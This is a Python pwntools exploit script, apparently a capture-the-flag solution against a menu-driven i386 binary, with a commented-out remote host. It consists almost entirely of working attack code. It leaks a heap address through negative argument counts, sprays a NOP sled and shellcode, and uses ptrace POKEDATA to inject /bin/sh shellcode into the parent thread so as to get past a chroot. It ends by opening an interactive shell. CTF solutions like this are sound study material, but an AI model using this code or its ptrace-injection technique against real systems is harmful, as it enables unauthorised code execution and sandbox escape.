from pwn import *

context.log_level = 'debug'

addr_last_func = 0x8049B0F
binsh_shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80\x90"
get_pid = asm("mov edi, [0x0804E158]")
get_pid += asm("add edi, 1")

shellcode = ""
shellcode += get_pid
shellcode += asm(shellcraft.i386.linux.ptrace('PTRACE_ATTACH', 'edi', 0, 0))
shellcode += get_pid
shellcode += asm(shellcraft.i386.linux.waitpid(-1, 0, 0))

for x in xrange(0, len(binsh_shellcode), 4):
    shellcode += get_pid
    shellcode += asm(shellcraft.i386.linux.ptrace('PTRACE_POKEDATA', 'edi', addr_last_func+x, u32(binsh_shellcode[x:x+4])))

shellcode += get_pid
shellcode += asm(shellcraft.i386.linux.ptrace('PTRACE_DETACH', 'edi', 0, 0))

#shellcode += asm(shellcraft.i386.linux.cat('/proc/self/maps'))

t = process('./syscall')
pause()
#t = remote('218.2.197.234', 2088)

def leave():
    t.recvuntil('option:\n')
    t.sendline('5')
    t.recvuntil('length\n')
    t.sendline('16384')
    t.recvuntil('message\n')
    t.sendline('\x90'*(16380-len(shellcode))+shellcode)

def add(name,addr):
    t.recvuntil('option:\n')
    t.sendline('2')
    t.recvuntil('name\n')
    t.sendline(name)
    t.recvuntil('number\n')
    t.sendline('3343')
    t.recvuntil('count(argc)\n')
    t.sendline('-10')
    t.recvuntil('0 to stop\n')
    t.sendline('-10')
    t.recvuntil('value\n')
    t.sendline(p32(addr))
    t.recvuntil('0 to stop\n')
    t.sendline('0')

def call(name):
    t.recvuntil('option:\n')
    t.sendline('1')
    t.recvuntil('call name:\n')
    t.sendline(name)

    t.recvuntil('option:\n')
    t.sendline('3')
for i in range(5):
    leave()
add('explorer',0x08048D30)
call('explorer')
heap = t.recv(4)
heap = u32(heap) - 0xd0
print hex(heap)
shell = heap + 0x9f54e18 - 0x9f54a08 
add('explorer1',shell)
call('explorer1')
t.interactive()


#because it used clone and fork, and the bug is in the child_thread,
#also it has been chrooted, the child thread doesnt have the authority to chroot
#we cant see the flag in root dir.
#the only way is to use pthread to write shellcode to main thread.
